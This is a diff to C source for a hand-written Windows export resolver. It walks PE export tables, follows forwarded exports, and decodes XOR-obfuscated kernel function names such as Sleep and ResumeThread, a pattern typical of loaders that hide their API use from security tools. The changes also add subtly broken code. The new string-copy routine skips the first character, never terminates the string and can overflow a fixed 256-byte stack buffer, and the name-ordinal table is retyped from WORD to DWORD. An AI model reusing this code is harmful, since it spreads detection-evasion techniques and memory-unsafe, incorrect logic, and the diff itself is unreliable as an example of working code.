@@ -350,6 +350,16 @@ BOOL MyStrCmpiAA(CHAR *sStr1, CHAR *sStr2)
     return bAreEqual;
 }
 
+void MyStrCpy(CHAR *sStr, CHAR* dStr)
+{
+    size_t index = 0;
+    while (*sStr++ != 0)
+    {
+        dStr[index] = sStr[index];
+        ++index;
+    }
+}
+
 CHAR *MyStrDup(CHAR *sStr)
 {
     size_t sStrLen = MyStrLen(sStr);
@@ -453,7 +463,8 @@ LPVOID MyGetProcAddressByName(ULONG_PTR ulModuleAddr, CHAR *sProcName)
 
     if ((lpvProcAddr > (ulModuleAddr + ExportDataDirectory.VirtualAddress)) && (lpvProcAddr <= (ulModuleAddr + ExportDataDirectory.VirtualAddress + ExportDataDirectory.Size)))
     {
-        char *DLLFunctionName = MyStrDup(lpvProcAddr);
+        CHAR DLLFunctionName[256];
+        MyStrCpy(DLLFunctionName, lpvProcAddr);
         char *FunctionName = MyStrChr(DLLFunctionName, '.');
 
         *FunctionName = 0;
@@ -461,8 +472,6 @@ LPVOID MyGetProcAddressByName(ULONG_PTR ulModuleAddr, CHAR *sProcName)
 
         HMODULE ForwardedDLL = pLoadLibraryA(DLLFunctionName);
         lpvProcAddr = MyGetProcAddressByName((BYTE *)ForwardedDLL, FunctionName);
-
-        pVirtualFree(DLLFunctionName, 0, MEM_RELEASE);
     }
 
     return (LPVOID)lpvProcAddr;
@@ -478,7 +487,7 @@ LPVOID MyGetProcAddressByOrdinal(ULONG_PTR ulModuleAddr, WORD wOrdinal)
 
     DWORD *AddressOfFunctions = (DWORD *)(ulModuleAddr + ExportDirectory->AddressOfFunctions);
     DWORD *AddressOfNames = (DWORD *)(ulModuleAddr + ExportDirectory->AddressOfNames);
-    WORD *AddressOfNameOridinals = (WORD *)(ulModuleAddr + ExportDirectory->AddressOfNameOrdinals);
+    DWORD *AddressOfNameOridinals = (DWORD *)(ulModuleAddr + ExportDirectory->AddressOfNameOrdinals);
 
     BYTE *lpvProcAddr = NULL;
 
@@ -491,7 +500,8 @@ LPVOID MyGetProcAddressByOrdinal(ULONG_PTR ulModuleAddr, WORD wOrdinal)
 
     if ((lpvProcAddr > (ulModuleAddr + ExportDataDirectory.VirtualAddress)) && (lpvProcAddr <= (ulModuleAddr + ExportDataDirectory.VirtualAddress + ExportDataDirectory.Size)))
     {
-        char *DLLFunctionName = MyStrDup(lpvProcAddr);
+        CHAR DLLFunctionName[256];
+        MyStrCpy(DLLFunctionName, lpvProcAddr);
         char *FunctionName = MyStrChr(DLLFunctionName, '.');
 
         *FunctionName = 0;
@@ -499,8 +509,6 @@ LPVOID MyGetProcAddressByOrdinal(ULONG_PTR ulModuleAddr, WORD wOrdinal)
 
         HMODULE ForwardedDLL = pLoadLibraryA(DLLFunctionName);
         lpvProcAddr = MyGetProcAddressByName((BYTE *)ForwardedDLL, FunctionName);
-
-        pVirtualFree(DLLFunctionName, 0, MEM_RELEASE);
     }
 
     return (LPVOID)lpvProcAddr;
@@ -616,7 +624,7 @@ void PopulateKernelFunctionPtrsByName(LPVOID lpvKernelDLL)
     MyXor(cResumeThread, 12, key, key_len);
     pResumeThread = MyGetProcAddressByName(lpvKernelDLL, cResumeThread);
 
-    char cSleep[] = {0x63, 0x5c, 0x55, 0x55, 0x40, 0x0};
+    char cSleep[] = {0x63, 0x5c, 0x55, 0x55, 0x40, 0};
     MyXor(cSleep, 5, key, key_len);
     pSleep = MyGetProcAddressByName(lpvKernelDLL, cSleep);
 
